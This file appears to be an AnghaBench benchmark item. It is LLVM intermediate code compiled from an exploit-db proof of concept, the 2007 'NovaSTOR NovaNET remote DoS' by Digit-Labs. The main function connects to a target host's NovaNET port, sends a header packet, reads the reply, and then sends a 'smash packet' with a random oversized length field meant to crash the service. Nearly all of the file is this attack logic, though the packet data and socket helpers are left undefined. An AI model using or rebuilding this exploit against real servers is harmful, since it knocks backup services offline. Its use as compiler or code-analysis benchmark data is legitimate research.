; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_33879.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_33879.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@NOVANET_PKT_SZ = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [106 x i8] c"NovaSTOR NovaNET remote DoS\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2007!@$!\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [18 x i8] c"Usage: %s <host>\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@NOVANET_TCP_PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [22 x i8] c"main: sockami failed\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c"* connected to %s:%d\0A\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c"** sending header packet...\00", align 1
@hdr_pkt = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [37 x i8] c"main: sock_send returned %d (!= %d)\0A\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"** reading first reply...\00", align 1
@.str.8 = private unnamed_addr constant [37 x i8] c"main: sock_recv returned %d (!= %d)\0A\00", align 1
@NOVANET_MAX_LEN = common dso_local global i32 0, align 4
@UINT_MAX = common dso_local global i32 0, align 4
@rem_pkt = common dso_local global i32* null, align 8
@.str.9 = private unnamed_addr constant [55 x i8] c"** sending smash packet [remaining length %u-bytes]...\00", align 1
@NOVANET_HDR_SZ = common dso_local global i32 0, align 4
@USLEEP_TIME = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %6, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %7, align 8
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str, i64 0, i64 0))
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %26

18:                                               ; preds = %2
  %19 = load i32, i32* @stderr, align 4
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i32, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  %24 = load i32, i32* @EXIT_SUCCESS, align 4
  %25 = call i32 @exit(i32 %24) #4
  unreachable

26:                                               ; preds = %2
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  %30 = load i32, i32* @NOVANET_TCP_PORT, align 4
  %31 = call i32 @sockami(i8* %29, i32 %30)
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %39

34:                                               ; preds = %26
  %35 = load i32, i32* @stderr, align 4
  %36 = call i32 (i32, i8*, ...) @fprintf(i32 %35, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %37 = load i32, i32* @EXIT_FAILURE, align 4
  %38 = call i32 @exit(i32 %37) #4
  unreachable

39:                                               ; preds = %26
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = load i32, i32* @NOVANET_TCP_PORT, align 4
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* %42, i32 %43)
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0))
  %46 = load i32, i32* %9, align 4
  %47 = load i32*, i32** @hdr_pkt, align 8
  %48 = call i32 @sock_send(i32 %46, i32* %47, i32 7)
  store i32 %48, i32* %10, align 4
  %49 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %50 = icmp ne i32 %48, %49
  br i1 %50, label %51, label %58

51:                                               ; preds = %39
  %52 = load i32, i32* @stderr, align 4
  %53 = load i32, i32* %10, align 4
  %54 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %55 = call i32 (i32, i8*, ...) @fprintf(i32 %52, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0), i32 %53, i32 %54)
  %56 = load i32, i32* @EXIT_FAILURE, align 4
  %57 = call i32 @exit(i32 %56) #4
  unreachable

58:                                               ; preds = %39
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0))
  %61 = load i32, i32* %9, align 4
  %62 = trunc i64 %12 to i32
  %63 = call i32 @sock_recv(i32 %61, i8* %14, i32 %62)
  store i32 %63, i32* %10, align 4
  %64 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %65 = icmp ne i32 %63, %64
  br i1 %65, label %66, label %73

66:                                               ; preds = %58
  %67 = load i32, i32* @stderr, align 4
  %68 = load i32, i32* %10, align 4
  %69 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %70 = call i32 (i32, i8*, ...) @fprintf(i32 %67, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.8, i64 0, i64 0), i32 %68, i32 %69)
  %71 = load i32, i32* @EXIT_FAILURE, align 4
  %72 = call i32 @exit(i32 %71) #4
  unreachable

73:                                               ; preds = %58
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %75 = call i32 @time(i32* null)
  %76 = call i32 @srand(i32 %75)
  %77 = load i32, i32* @NOVANET_MAX_LEN, align 4
  %78 = call i32 (...) @rand()
  %79 = load i32, i32* @UINT_MAX, align 4
  %80 = load i32, i32* @NOVANET_MAX_LEN, align 4
  %81 = sub nsw i32 %79, %80
  %82 = srem i32 %78, %81
  %83 = add nsw i32 %77, %82
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %8, align 4
  %85 = load i32, i32* %8, align 4
  %86 = load i32*, i32** @rem_pkt, align 8
  %87 = getelementptr inbounds i32, i32* %86, i64 12
  store i32 %85, i32* %87, align 4
  %88 = load i32, i32* %8, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.9, i64 0, i64 0), i32 %88)
  %90 = load i32, i32* %9, align 4
  %91 = load i32*, i32** @rem_pkt, align 8
  %92 = call i32 @sock_send(i32 %90, i32* %91, i32 7)
  store i32 %92, i32* %10, align 4
  %93 = load i32, i32* @NOVANET_HDR_SZ, align 4
  %94 = icmp ne i32 %92, %93
  br i1 %94, label %95, label %102

95:                                               ; preds = %73
  %96 = load i32, i32* @stderr, align 4
  %97 = load i32, i32* %10, align 4
  %98 = load i32, i32* @NOVANET_HDR_SZ, align 4
  %99 = call i32 (i32, i8*, ...) @fprintf(i32 %96, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0), i32 %97, i32 %98)
  %100 = load i32, i32* @EXIT_FAILURE, align 4
  %101 = call i32 @exit(i32 %100) #4
  unreachable

102:                                              ; preds = %73
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %104 = load i32, i32* @USLEEP_TIME, align 4
  %105 = call i32 @usleep(i32 %104)
  %106 = load i32, i32* %9, align 4
  %107 = call i32 @close(i32 %106)
  %108 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %108, i32* %3, align 4
  %109 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %109)
  %110 = load i32, i32* %3, align 4
  ret i32 %110
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @sock_send(i32, i32*, i32) #2

declare dso_local i32 @sock_recv(i32, i8*, i32) #2

declare dso_local i32 @srand(i32) #2

declare dso_local i32 @time(i32*) #2

declare dso_local i32 @rand(...) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
